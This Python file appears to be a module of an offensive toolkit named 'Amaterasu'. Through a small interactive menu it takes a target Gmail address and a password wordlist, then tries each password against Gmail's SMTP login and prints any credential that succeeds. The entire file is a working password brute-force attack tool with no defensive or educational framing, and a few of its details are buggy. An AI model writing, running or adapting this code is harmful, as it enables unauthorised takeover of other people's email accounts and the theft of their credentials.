#coding: utf-8
#!/usr/bin/python3

from huepy import *
import smtplib
import sys

def gmail_bruteforce_CONFIG():
	target = ''
	passwords = ''
	port = ''

	while True:
		user = input(bold(red('\nAMATERASU ')) + '(' + bold(lightcyan('gmail_bruteforce')) + ')' + '> ')
		if user.startswith('set'):
			try:
				if user.split(' ')[1] == 'target' or user.split(' ')[1] == 'TARGET':
					target = user.split(' ')[2]
					print(bold(info('Target set: ' + target)))
				elif user.split(' ')[1] == 'port' or user.split(' ')[1] == 'PORT':
					port = user.split(' ')[2]
					print(bold(info('Port set: ' + port)))
				elif user.split(' ')[1] == 'passwords' or user.split(' ')[1] == 'PASSWORDS':
					passwords = user.split(' ')[2]
					print(bold(info('Password wordlist set: ' + passwords)))
				else:
					print(bold(bad('Error: option do not exist.')))
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('port\tset port PORT (default: 465)')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
			except IndexError:
				print(bold(info('Select what to set.\n')))
				print(bold(info('target\tset target TARGET')))
				print(bold(info('port\tset port PORT (default: 465)')))
				print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
		elif user.startswith('show'):
			try:
				if user.split(' ')[1] == 'config':
					print(bold(info('Target:\t\t' + target)))
					print(bold(info('User:\t\t' + port)))
					print(bold(info('Password wordlist:\t\t' + passwords)))
				elif user.split(' ')[1] == 'options':
					print(bold(info('Select what to set.\n')))
					print(bold(info('target\tset target TARGET')))
					print(bold(info('port\tset port PORT')))
					print(bold(info('password wordlist\tset passwords PASSWORD_LIST')))
				else:
					print(bold(bad('Error: option do not exist.')))
			except IndexError:
				print(bold(info('Select what to show.\n')))
				print(bold(info('Config\t\tshow config')))
				print(bold(info('Options\t\tshow options')))
		elif user.startswith('run'):
			if port is None:
				port = '465'
			else:
				port = port
			try:
				gmail_bruteforce(target, passwords, port)
			except Exception as e:
				print(bold(bad('Error: {}'.format(e))))
		elif user == 'back':
			break
		elif user == 'exit':
			print(bold(good('Thanks for using Amaterasu.')))
			sys.exit()

def gmail_bruteforce(target, passwords, port):
	passw = open(passwords, 'r')

	for password in passw:
		try:
			server = smtplib.SMTP_SSL('smtp.gmail.com', port)
			server.login(target, password)
			print(bold(bad('Sucess.')))
			print(bold(bad('Username found: ' + target)))
			print(bold(good('Password found: ' + password)))
			break
		except smtplib.SMTPAuthenticationError:
			print(bold(bad('Failed.')))
			print(bold(bad('Username failed: ' + target)))
			print(bold(bad('Password failed: ' + password)))
		except Exception as e:
			print(bold(bad('Error: {}'.format(e))))
